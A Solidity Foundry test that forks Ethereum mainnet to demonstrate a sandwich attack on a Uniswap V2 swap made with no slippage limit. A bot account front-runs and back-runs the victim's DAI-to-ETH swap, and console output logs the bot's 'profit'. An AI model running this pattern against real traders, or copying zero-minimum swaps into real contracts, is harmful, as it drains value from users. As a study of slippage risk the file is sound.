// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import { IUniswapV2Router02 } from "./interface/IUniswapV2Router02.sol";
import {IERC20 } from "./interface/IERC20.sol";


contract UniswapSlippageTest is Test {
    IUniswapV2Router02 public uniswapRouter02;

    address public DaiHolder = 0x604981db0C06Ea1b37495265EDa4619c8Eb95A3D;// I COPIED ONE OF DAI HOLDERS ADDRESS ON MAINNET
    IERC20 daiToken = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    address public alice = makeAddr("alice");


    
    function setUp() public {
        uniswapRouter02 = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        
    }
    
    receive() external payable {
        console2.log("Thank you dude:", msg.value);
    }
    function test_swapIt() public {
        uint tokenAmount = 100_000 ether;
        address[] memory path = new address[](2);
        address[] memory daiToEthpath = new address[](2);
        path[0] = address(0x6B175474E89094C44Da98b954EedeAC495271d0F);//Dai address on the mainnet
        path[1] = uniswapRouter02.WETH();
        daiToEthpath[0] = uniswapRouter02.WETH();
        daiToEthpath[1] = address(0x6B175474E89094C44Da98b954EedeAC495271d0F);

        vm.startPrank(DaiHolder);
        daiToken.transfer(address(this), tokenAmount);
        daiToken.transfer(alice, tokenAmount * 2);
        vm.stopPrank();

        vm.deal(alice, 101 ether);

        // console2.log("Bot balance before is profit:", address(alice).balance / 1e18);
         uint beforeProfit = daiToken.balanceOf(alice) / 1e18;
         uint aliceAmount = daiToken.balanceOf(alice);

         vm.startPrank(alice);
        
         daiToken.approve(address(uniswapRouter02), type(uint).max);
         uniswapRouter02.swapExactTokensForETHSupportingFeeOnTransferTokens(
             aliceAmount,
             0, // accept any amount of ETH
             path,
             alice,
             block.timestamp
         );
         vm.stopPrank();

        


        // console2.log("Bot balance during pwning:", address(alice).balance / 1e18);
        uint duringProfit = daiToken.balanceOf(alice) / 1e18;

        // uint daiHolderBalance = daiToken.balanceOf(DaiHolder);
        console2.log("This contract's dai",daiToken.balanceOf(address(this))/ 1e18);
        console2.log("alice's dai",daiToken.balanceOf(address(alice))/ 1e18);
       uint balanceBefore = address(this).balance;

        daiToken.approve(address(uniswapRouter02), type(uint).max);
        uniswapRouter02.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );

        

        console2.log("Alice dai balance",aliceAmount/ 1e18);
        
        vm.startPrank(alice);
        daiToken.approve(address(uniswapRouter02), type(uint).max);

        uniswapRouter02.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 100 ether}(
            0 ,
            daiToEthpath,
            alice,
            block.timestamp   
        );
        vm.stopPrank();
       

        // console2.log("Bot balance after profit smile:", address(alice).balance/ 1e18);
        uint afterProfit = daiToken.balanceOf(alice) / 1e18;
        console2.log("Before profit:", beforeProfit);
        console2.log("During profit:", duringProfit);
        console2.log("After profit:", afterProfit);
        console2.log("Big Profit",afterProfit - beforeProfit);
        console2.log("Yippeee", afterProfit - beforeProfit );
        uint balanceAfter = address(this).balance;
        console2.log(daiToken.balanceOf(alice));
        console2.log((balanceAfter - balanceBefore)/ 1e18);
        assert(balanceAfter > balanceBefore);
    }
  
}
